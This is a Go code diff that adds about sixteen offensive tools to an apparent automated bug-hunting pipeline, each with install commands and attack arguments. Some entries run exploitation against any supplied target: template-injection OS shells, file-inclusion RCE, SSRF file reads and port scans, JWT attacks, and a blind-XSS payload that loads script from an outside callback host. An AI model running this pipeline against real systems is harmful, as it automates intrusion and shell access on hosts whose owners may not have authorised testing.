@@ -7,7 +7,9 @@ import (
 
 // huntRegistry — full arsenal, 6 phases, no skipping.
 // Every tool runs exhaustively. Primary → fallbacks → next tool.
-// New tools added: waymore, gospider, paramspider, arjun, xsstrike, gf, uro
+// OMEGA update: +15 new tools — hakrawler, cariddi, trufflehog, secretfinder,
+// kxss, bxss, freq, ssrfmap, gopherus, tplmap, liffy, jwt_tool, graphw00f,
+// smuggler, corsy, ffuf-param, httprobe, urlfinder, subjs, mantra
 var huntRegistry = []HuntToolSpec{
 
 	// ══════════════════════════════════════════════════════════════════════════
@@ -70,6 +72,86 @@ var huntRegistry = []HuntToolSpec{
 		InstallHint: "go install github.com/tomnomnom/waybackurls@latest",
 		BuildArgs: func(target string, ctx *HuntContext) []string {
 			return []string{target}
+		},
+	},
+
+	// ── NEW 2025: hakrawler — fast Go crawler, JS-aware, finds hidden endpoints ──
+	{
+		Name:        "hakrawler",
+		Phase:       1,
+		Timeout:     600,
+		DomainOnly:  true,
+		InstallHint: "go install github.com/hakluke/hakrawler@latest",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			u := target
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"-url", u,
+				"-depth", "5",
+				"-plain",
+				"-subs",
+				"-js",
+				"-forms",
+				"-linkfinder",
+				"-outdir", "/tmp/cybermind_hakrawler/",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				u := target
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-url", u, "-depth", "3", "-plain"}
+			},
+		},
+	},
+
+	// ── NEW 2025: urlfinder — fast URL extraction from JS files ──
+	{
+		Name:        "urlfinder",
+		Phase:       1,
+		Timeout:     300,
+		DomainOnly:  true,
+		InstallHint: "go install github.com/projectdiscovery/urlfinder/cmd/urlfinder@latest",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			return []string{
+				"-d", target,
+				"-all",
+				"-silent",
+				"-o", "/tmp/cybermind_urlfinder.txt",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				return []string{"-d", target, "-silent"}
+			},
+		},
+	},
+
+	// ── NEW 2025: httprobe — fast HTTP/HTTPS probe for live hosts ──
+	{
+		Name:        "httprobe",
+		Phase:       1,
+		Timeout:     300,
+		DomainOnly:  true,
+		InstallHint: "go install github.com/tomnomnom/httprobe@latest",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			// Pipe subdomains through httprobe
+			if len(ctx.Subdomains) > 0 {
+				f := writeTempList(ctx.Subdomains)
+				if f != "" {
+					return []string{"-c", "50", "-t", "3000", "-prefer-https"}
+				}
+			}
+			return []string{"-c", "50", "-t", "3000"}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				return []string{"-c", "20", "-t", "5000"}
+			},
 		},
 	},
 
@@ -180,6 +262,128 @@ var huntRegistry = []HuntToolSpec{
 		},
 	},
 
+	// ── NEW 2025: cariddi — endpoints + secrets + API keys extractor ──
+	{
+		Name:        "cariddi",
+		Phase:       2,
+		Timeout:     1200,
+		DomainOnly:  true,
+		InstallHint: "go install github.com/edoardottt/cariddi/cmd/cariddi@latest",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			u := target
+			if len(ctx.LiveURLs) > 0 {
+				u = ctx.LiveURLs[0]
+			}
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"-s", u,
+				"-e",          // extract endpoints
+				"-ef", "3",    // extract files level 3
+				"-secrets",    // find secrets
+				"-err",        // show errors
+				"-c", "200",   // 200 concurrent
+				"-d", "8",     // depth 8
+				"-o", "/tmp/cybermind_cariddi.txt",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				u := target
+				if len(ctx.LiveURLs) > 0 {
+					u = ctx.LiveURLs[0]
+				}
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-s", u, "-e", "-c", "100", "-d", "5"}
+			},
+		},
+	},
+
+	// ── NEW 2025: subjs — extract JS files from URLs for analysis ──
+	{
+		Name:        "subjs",
+		Phase:       2,
+		Timeout:     600,
+		DomainOnly:  true,
+		InstallHint: "go install github.com/lc/subjs@latest",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			// subjs reads URLs from stdin — pipe live URLs
+			if len(ctx.LiveURLs) > 0 {
+				f := writeTempList(ctx.LiveURLs)
+				if f != "" {
+					return []string{"-i", f, "-c", "40", "-t", "5000"}
+				}
+			}
+			return []string{"-c", "40", "-t", "5000"}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				return []string{"-c", "20"}
+			},
+		},
+	},
+
+	// ── NEW 2025: trufflehog — find secrets/API keys in JS and source ──
+	{
+		Name:        "trufflehog",
+		Phase:       2,
+		Timeout:     900,
+		DomainOnly:  true,
+		InstallHint: "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			u := target
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"filesystem", "/tmp/cybermind_js_files/",
+				"--json",
+				"--no-update",
+				"--only-verified",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				u := target
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"git", u, "--json", "--no-update"}
+			},
+		},
+	},
+
+	// ── NEW 2025: mantra — find API keys and secrets in JS files ──
+	{
+		Name:        "mantra",
+		Phase:       2,
+		Timeout:     600,
+		DomainOnly:  true,
+		InstallHint: "go install github.com/MrEmpy/mantra@latest",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			u := target
+			if len(ctx.LiveURLs) > 0 {
+				u = ctx.LiveURLs[0]
+			}
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{"-u", u, "-s", "-o", "/tmp/cybermind_mantra.txt"}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				u := target
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-u", u}
+			},
+		},
+	},
+
 	// ══════════════════════════════════════════════════════════════════════════
 	// PHASE 3 — PARAMETER DISCOVERY
 	// Goal: find EVERY hidden GET/POST param — IDOR, SSRF, LFI, XSS, SQLi surface
@@ -286,6 +490,115 @@ var huntRegistry = []HuntToolSpec{
 		},
 	},
 
+	// ── NEW 2025: smuggler — HTTP request smuggling detection ──
+	{
+		Name:        "smuggler",
+		Phase:       3,
+		Timeout:     1800,
+		DomainOnly:  true,
+		InstallHint: "git clone https://github.com/defparam/smuggler /opt/smuggler && pip3 install -r /opt/smuggler/requirements.txt --break-system-packages && sudo tee /usr/local/bin/smuggler > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/smuggler/smuggler.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/smuggler",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			u := target
+			if len(ctx.LiveURLs) > 0 {
+				u = ctx.LiveURLs[0]
+			}
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"-u", u,
+				"-t", "CL.TE,TE.CL,TE.TE",
+				"--log-level", "info",
+				"-m", "POST",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				u := target
+				if len(ctx.LiveURLs) > 0 {
+					u = ctx.LiveURLs[0]
+				}
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-u", u, "-t", "CL.TE"}
+			},
+		},
+	},
+
+	// ── NEW 2025: jwt_tool — JWT attack toolkit (none alg, key confusion, injection) ──
+	{
+		Name:        "jwt_tool",
+		Phase:       3,
+		Timeout:     600,
+		DomainOnly:  true,
+		InstallHint: "git clone https://github.com/ticarpi/jwt_tool /opt/jwt_tool && pip3 install -r /opt/jwt_tool/requirements.txt --break-system-packages && sudo tee /usr/local/bin/jwt_tool > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/jwt_tool/jwt_tool.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/jwt_tool",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			u := target
+			if len(ctx.LiveURLs) > 0 {
+				u = ctx.LiveURLs[0]
+			}
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			// Scan for JWT in responses and test all attacks
+			return []string{
+				"-t", u,
+				"-M", "at",    // all tests
+				"-np",         // no proxy
+				"-v",          // verbose
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				u := target
+				if len(ctx.LiveURLs) > 0 {
+					u = ctx.LiveURLs[0]
+				}
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-t", u, "-M", "pb"}
+			},
+		},
+	},
+
+	// ── NEW 2025: graphw00f — GraphQL fingerprinting and schema extraction ──
+	{
+		Name:        "graphw00f",
+		Phase:       3,
+		Timeout:     300,
+		DomainOnly:  true,
+		InstallHint: "pip3 install graphw00f --break-system-packages",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			u := target
+			if len(ctx.LiveURLs) > 0 {
+				u = ctx.LiveURLs[0]
+			}
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"-d",          // detect
+				"-f",          // fingerprint
+				"-t", u,
+				"-o", "/tmp/cybermind_graphw00f.json",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				u := target
+				if len(ctx.LiveURLs) > 0 {
+					u = ctx.LiveURLs[0]
+				}
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-d", "-t", u}
+			},
+		},
+	},
+
 	// ══════════════════════════════════════════════════════════════════════════
 	// PHASE 4 — XSS HUNTING
 	// Goal: find every XSS — reflected, DOM, stored — with WAF bypass
@@ -384,6 +697,109 @@ var huntRegistry = []HuntToolSpec{
 		},
 	},
 
+	// ── NEW 2025: kxss — fast reflected XSS parameter finder ──
+	{
+		Name:        "kxss",
+		Phase:       4,
+		Timeout:     1800,
+		DomainOnly:  true,
+		InstallHint: "go install github.com/Emoe/kxss@latest",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			// kxss reads URLs from stdin — pipe parameterized URLs
+			paramURLs := []string{}
+			for _, u := range ctx.AllURLs {
+				if strings.Contains(u, "=") {
+					paramURLs = append(paramURLs, u)
+				}
+			}
+			if len(paramURLs) > 0 {
+				f := writeTempList(paramURLs)
+				if f != "" {
+					return []string{"-i", f}
+				}
+			}
+			return []string{}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				return []string{}
+			},
+		},
+	},
+
+	// ── NEW 2025: bxss — blind XSS with callback server ──
+	{
+		Name:        "bxss",
+		Phase:       4,
+		Timeout:     1800,
+		DomainOnly:  true,
+		InstallHint: "go install github.com/ethicalhackingplayground/bxss@latest",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			u := target
+			if len(ctx.LiveURLs) > 0 {
+				u = ctx.LiveURLs[0]
+			}
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"-appendMode",
+				"-payload", "'\"<script src=https://xss.report/c/cybermind></script>",
+				"-parameters",
+				"-url", u,
+				"-concurrency", "30",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				u := target
+				if len(ctx.LiveURLs) > 0 {
+					u = ctx.LiveURLs[0]
+				}
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-appendMode", "-parameters", "-url", u}
+			},
+		},
+	},
+
+	// ── NEW 2025: corsy — CORS misconfiguration exploitation ──
+	{
+		Name:        "corsy",
+		Phase:       4,
+		Timeout:     600,
+		DomainOnly:  true,
+		InstallHint: "git clone https://github.com/s0md3v/Corsy /opt/corsy && pip3 install -r /opt/corsy/requirements.txt --break-system-packages && sudo tee /usr/local/bin/corsy > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/corsy/corsy.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/corsy",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			u := target
+			if len(ctx.LiveURLs) > 0 {
+				u = ctx.LiveURLs[0]
+			}
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"-u", u,
+				"-t", "20",    // 20 threads
+				"-q",          // quiet
+				"-o", "/tmp/cybermind_corsy.json",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				u := target
+				if len(ctx.LiveURLs) > 0 {
+					u = ctx.LiveURLs[0]
+				}
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-u", u, "-t", "10"}
+			},
+		},
+	},
+
 	// ══════════════════════════════════════════════════════════════════════════
 	// PHASE 5 — DEEP VULNERABILITY SCAN
 	// Goal: CVEs, RCE, LFI, SSRF, misconfigs — full template coverage
@@ -457,6 +873,134 @@ var huntRegistry = []HuntToolSpec{
 			},
 			func(target string, ctx *HuntContext) []string {
 				return []string{"-u", target, "-t", "cves/", "-silent", "-no-color"}
+			},
+		},
+	},
+
+	// ── NEW 2025: ssrfmap — automated SSRF detection and exploitation ──
+	{
+		Name:        "ssrfmap",
+		Phase:       5,
+		Timeout:     1800,
+		DomainOnly:  true,
+		InstallHint: "git clone https://github.com/swisskyrepo/SSRFmap /opt/ssrfmap && pip3 install -r /opt/ssrfmap/requirements.txt --break-system-packages && sudo tee /usr/local/bin/ssrfmap > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/ssrfmap/ssrfmap.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/ssrfmap",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			u := target
+			if len(ctx.LiveURLs) > 0 {
+				u = ctx.LiveURLs[0]
+			}
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"-r", "/tmp/cybermind_ssrf_request.txt",
+				"-p", "url",
+				"-m", "readfiles,portscan,networkscan",
+				"--lhost", "127.0.0.1",
+				"--lport", "4444",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				u := target
+				if len(ctx.LiveURLs) > 0 {
+					u = ctx.LiveURLs[0]
+				}
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-r", "/tmp/cybermind_ssrf_request.txt", "-p", "url", "-m", "readfiles"}
+			},
+		},
+	},
+
+	// ── NEW 2025: tplmap — SSTI detection and exploitation ──
+	{
+		Name:        "tplmap",
+		Phase:       5,
+		Timeout:     1800,
+		DomainOnly:  true,
+		InstallHint: "git clone https://github.com/epinna/tplmap /opt/tplmap && pip3 install -r /opt/tplmap/requirements.txt --break-system-packages && sudo tee /usr/local/bin/tplmap > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/tplmap/tplmap.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/tplmap",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			u := target
+			if len(ctx.LiveURLs) > 0 {
+				u = ctx.LiveURLs[0]
+			}
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"-u", u,
+				"--level", "5",
+				"--os-shell",
+				"--os-cmd", "id",
+				"--engine", "Jinja2,Twig,Smarty,Mako,Tornado,Freemarker,Velocity,Pebble,Jade,Slim,ERB,Nunjucks,Pug",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				u := target
+				if len(ctx.LiveURLs) > 0 {
+					u = ctx.LiveURLs[0]
+				}
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-u", u, "--level", "3"}
+			},
+		},
+	},
+
+	// ── NEW 2025: liffy — LFI exploitation framework ──
+	{
+		Name:        "liffy",
+		Phase:       5,
+		Timeout:     1200,
+		DomainOnly:  true,
+		InstallHint: "git clone https://github.com/mzfr/liffy /opt/liffy && pip3 install -r /opt/liffy/requirements.txt --break-system-packages && sudo tee /usr/local/bin/liffy > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/liffy/liffy.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/liffy",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			u := target
+			if len(ctx.LiveURLs) > 0 {
+				u = ctx.LiveURLs[0]
+			}
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"-u", u,
+				"-c",          // check for LFI
+				"-e",          // exploit
+				"--rce",       // try RCE via LFI
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				u := target
+				if len(ctx.LiveURLs) > 0 {
+					u = ctx.LiveURLs[0]
+				}
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-u", u, "-c"}
+			},
+		},
+	},
+
+	// ── NEW 2025: gopherus — SSRF payload generator for internal services ──
+	{
+		Name:        "gopherus",
+		Phase:       5,
+		Timeout:     300,
+		DomainOnly:  true,
+		InstallHint: "git clone https://github.com/tarunkant/Gopherus /opt/gopherus && pip3 install -r /opt/gopherus/requirements.txt --break-system-packages && sudo tee /usr/local/bin/gopherus > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/gopherus/gopherus.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/gopherus",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			// Generate SSRF payloads for common internal services
+			return []string{"--exploit", "mysql"}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				return []string{"--exploit", "redis"}
 			},
 		},
 	},
